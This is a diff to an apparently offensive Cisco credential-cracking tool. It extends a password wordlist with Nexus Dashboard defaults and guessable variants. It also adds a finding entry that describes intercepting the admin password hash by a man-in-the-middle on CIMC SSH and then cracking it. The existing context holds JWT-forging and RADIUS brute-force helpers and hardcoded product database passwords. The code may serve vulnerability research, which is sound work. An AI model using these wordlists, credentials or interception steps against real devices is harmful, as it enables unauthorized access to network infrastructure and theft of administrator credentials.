@@ -23,7 +23,9 @@ Active exploitation helpers:
   forge_fdm_jwt()       Forge FDM JWT with static HMAC-SHA256 key (Vuln-2)
   crack_radius_secret() Brute-force RADIUS shared secret from packet capture (ASA-F1)
 
-Wordlist: RE across 79xx/78xx/88xx/89xx/CUCM/FTD/FMC/ASA — all ablation modules.
+Wordlist: RE across 79xx/78xx/88xx/89xx/CUCM/FTD/FMC/ASA/ND — all ablation modules.
+  ND section: Admin1234!, rescue-user, ndadmin, bootstrap, cluster, nexusdashboard + mutations.
+  ND-F56: ND bootstrap JSON admin_passwd hash — interceptable via ND-F57 CIMC SSH MITM.
 Pre-verified fast-path hits avoid iteration on all known findings.
 
 Usage (library):
@@ -351,6 +353,29 @@ _CISCO_BASE_WORDS = [
     "hxjnynvf",           # FMC-F17: SymmetricDS prior Sybase vms dba password (rotated from dmkebdpq)
     "L2)_Ki*IDQbT2DMHw&tu[e<kba-kj}uGBb.myX_1",  # FMC-F17: SymmetricDS prior MySQL root (rotated)
     "IlahU)[hO8Ug}jdX:)5zoZx[297l*{Qv@4]wVk]/",  # FMC-F17: SymmetricDS current MySQL root password
+
+    # ── Nexus Dashboard 3.2.2m bootstrap (ND-F56) ────────────────────────────
+    # admin_passwd hash in bootstrap JSON blob (interceptable via ND-F57 MITM on CIMC SSH)
+    # ND documented defaults + common deployment patterns
+    "Admin1234!",         # ND documented initial admin password (Installation Guide p.12)
+    "admin1234",
+    "Admin1234",
+    "Cisco!23",           # ND lab/CI variant
+    "Cisco!123",
+    "ndadmin",            # ND admin username = password pattern
+    "ndadmin1",
+    "rescue-user",        # ND rescue-user account (bootstrap_virtual.py; firstboot provisioning)
+    "ndrescue",
+    "bootstrap",
+    "ndbootstrap",
+    "cluster",
+    "cluster1",
+    "Cluster1!",
+    "nexusdashboard",
+    "nexus",
+    "nd!23",
+    "nd123",
+    "nd1234",
 ]
 
 
@@ -1278,6 +1303,29 @@ ABLATION_FINDINGS = {
             "+256 bytes": "full gp_obj corruption (extraction cap)",
         },
         "status": "Runtime verification in progress on authorized test environment",
+    },
+    "ND-F56": {
+        "finding": (
+            "Nexus Dashboard bootstrap JSON admin_passwd hash interceptable via CIMC SSH MITM (ND-F57). "
+            "bootstrap.expect sends full JSON blob (nodeName, nodeRole, clusterUUID, seedList, "
+            "appNetwork, serviceNetwork, admin_passwd) over SSH with StrictHostKeyChecking=no. "
+            "Wordlist seeded with ND documented defaults and common deployment patterns."
+        ),
+        "hash_field": "admin_passwd in bootstrap cluster_install.json",
+        "hash_source": "bootstrap_virtual.py: config['admin_passwd'] = self['passwordHash']",
+        "intercept_path": (
+            "bootstrap-common.expect cimclogin: StrictHostKeyChecking=no + UserKnownHostsFile=/dev/null "
+            "-> MITM CIMC SSH -> capture bootstrap JSON -> extract admin_passwd hash"
+        ),
+        "intercept_finding": "ND-F57",
+        "proc_leak_finding": "ND-F56",
+        "hash_algorithm": "UNKNOWN — passwordHash field in bootstrap JSON; likely SHA-512crypt or bcrypt; "
+                          "use detect_hash_type() on extracted hash; wordlist is _CISCO_BASE_WORDS ND section",
+        "wordlist_added": [
+            "Admin1234!", "admin1234", "Admin1234", "Cisco!23", "Cisco!123",
+            "ndadmin", "rescue-user", "bootstrap", "cluster", "nexusdashboard",
+        ],
+        "usage": "crack(admin_passwd_hash, username='admin') — prioritizes username=password then ND defaults",
     },
 }
 
